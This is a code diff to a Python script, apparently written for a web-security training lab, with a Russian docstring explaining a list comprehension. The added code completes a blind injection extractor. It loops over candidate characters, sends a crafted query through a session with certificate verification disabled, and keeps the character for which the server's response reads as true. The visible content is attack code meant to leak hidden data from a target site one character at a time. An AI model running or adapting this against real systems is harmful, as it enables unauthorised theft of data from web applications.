@@ -71,7 +71,7 @@ def determine_response_length(inner_query, url, no_proxy=False):
             return i
 
 
-def determind_response_char(inner_query, index):
+def determine_response_char(inner_query, index, url, no_proxy=False):
     """
     chars = [ord(x) for x in AVAIL_CHARS]
     Это генератор списка (list comprehension), который:
@@ -80,8 +80,18 @@ def determind_response_char(inner_query, index):
     Преобразует этот символ в его ASCII-код с помощью ord(x).
     Собирает все ASCII-коды в новый список.
     """
+    sess = requests.Session()
     chars = [ord(x) for x in AVAIL_CHARS]
-    for 
+    for x in chars:
+        outer_query = format_char_query(inner_query, index, x)
+        prepped = format_request(url, outer_query)
+        if no_proxy:
+            resp = sess.send(prepped)
+        else:
+            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
+        if is_true(resp):
+            response_char = chr(x)
+            return response_char
 
 
 def main(args):
@@ -92,6 +102,7 @@ def main(args):
         inner_query, shop.base_url, shop.no_proxy)
         
     print(response_length)
+    print(determine_response_char(inner_query, 1, shop.base_url))
     #here
 
 if __name__ == "__main__":
